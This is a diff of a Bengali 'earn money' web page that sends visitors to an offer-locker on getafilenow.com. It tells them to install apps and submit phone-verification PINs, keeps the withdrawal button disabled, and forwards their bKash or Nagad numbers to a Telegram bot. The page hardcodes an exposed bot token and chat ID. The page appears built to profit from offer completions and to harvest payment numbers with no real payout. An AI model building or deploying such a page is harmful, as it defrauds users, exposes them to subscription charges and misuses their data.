@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>মিষ্টি আম আর্নিং</title>
-    <script type="text/javascript" src="https://getafilenow.com/script_include.php?id=1881500"></script>
     
     <style>
         body { font-family: 'Arial', sans-serif; background-color: #f0f2f5; text-align: center; margin: 0; padding: 0; color: #333; }
@@ -19,7 +18,7 @@
         .guide-box h3 { margin-top: 0; color: #0d47a1; font-size: 18px; }
         .guide-box ul { padding-left: 20px; font-size: 14px; line-height: 1.6; }
 
-        .btn-main { display: block; width: 80%; margin: 15px auto; padding: 18px; border-radius: 15px; font-size: 18px; font-weight: bold; border: none; transition: 0.3s; cursor: pointer; }
+        .btn-main { display: block; width: 80%; margin: 15px auto; padding: 18px; border-radius: 15px; font-size: 18px; font-weight: bold; text-decoration: none; border: none; transition: 0.3s; cursor: pointer; }
         .btn-work { background-color: #2196F3; color: white; box-shadow: 0 4px 12px rgba(33, 150, 243, 0.3); }
         .btn-withdraw { background-color: #bdbdbd; color: white; cursor: not-allowed; }
         .btn-active { background-color: #4caf50; cursor: pointer; box-shadow: 0 4px 12px rgba(76, 175, 80, 0.3); }
@@ -37,24 +36,23 @@
         <p style="font-size: 13px; color: #d32f2f; font-weight: bold;">মিনিমাম উইথড্র: ১০০ টাকা</p>
     </div>
 
-    <button onclick="call_locker();" class="btn-main btn-work">🚀 আনলিমিটেড কাজ করুন</button>
+    <a href="https://getafilenow.com/show.php?l=0&u=1881500" class="btn-main btn-work">🚀 আনলিমিটেড কাজ করুন</a>
 
     <div class="guide-box">
         <h3>📖 কাজ করার সঠিক নিয়ম:</h3>
         <ul>
-            <li>উপরের নীল বাটনে ক্লিক করলে আপনার সামনে অনেকগুলো কাজ (Apps/Offers) আসবে।</li>
-            <li>যে কোনো একটি কাজ পছন্দ করে তার ওপর ক্লিক করুন।</li>
-            <li>যদি অ্যাপ ডাউনলোড করতে বলে, তবে অ্যাপটি নামিয়ে ৩০ সেকেন্ড ব্যবহার করুন।</li>
-            <li>যদি নম্বর ভেরিফাই করতে বলে, তবে সঠিক নম্বর দিয়ে পিন সাবমিট করুন।</li>
-            <li>একটি কাজ সফলভাবে শেষ করলে অটোমেটিক পয়েন্ট যোগ হবে।</li>
+            <li>উপরের নীল বাটনে ক্লিক করলে কাজের লিস্ট আসবে।</li>
+            <li>অ্যাপ ডাউনলোড বা নম্বর ভেরিফাইয়ের কাজগুলো সম্পন্ন করুন।</li>
+            <li>সঠিক তথ্য দিয়ে কাজ শেষ করলে পয়েন্ট যোগ হবে।</li>
+            <li>পেমেন্ট পেতে কোনো প্রকার VPN ব্যবহার করবেন না।</li>
         </ul>
     </div>
 
     <button id="withdrawBtn" class="btn-main btn-withdraw" onclick="sendPaymentRequest()" disabled>💰 পেমেন্ট নিন (বিকাশ/নগদ)</button>
 
     <script>
-        let userPoints = 0.00; 
-        const rate = 0.4; 
+        let userPoints = 0.00; // শুরুতে পয়েন্ট ০
+        const rate = 0.4; // ১০০ পয়েন্ট = ৪০ টাকা
         const botToken = "7763993767:AAF8_u_Hq43Yc67sHk7H4mk3EkFIF8NFLFw"; 
         const chatId = "8074594735"; 
 
@@ -71,7 +69,7 @@
         }
 
         function sendPaymentRequest() {
-            let method = prompt("পেমেন্ট মাধ্যম লিখুন (বিকাশ নাকি নগদ?):");
+            let method = prompt("পেমেন্ট মাধ্যম (বিকাশ/নগদ):");
             let number = prompt("আপনার নম্বরটি দিন:");
             
             if (method && number) {
@@ -79,14 +77,12 @@
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
                 fetch(url).then(res => {
-                    if(res.ok) alert("সফলভাবে রিকোয়েস্ট পাঠানো হয়েছে!");
+                    if(res.ok) alert("রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে!");
                 });
             }
         }
 
         updateUI();
     </script>
-
 </body>
-    </html>
-    
+</html>
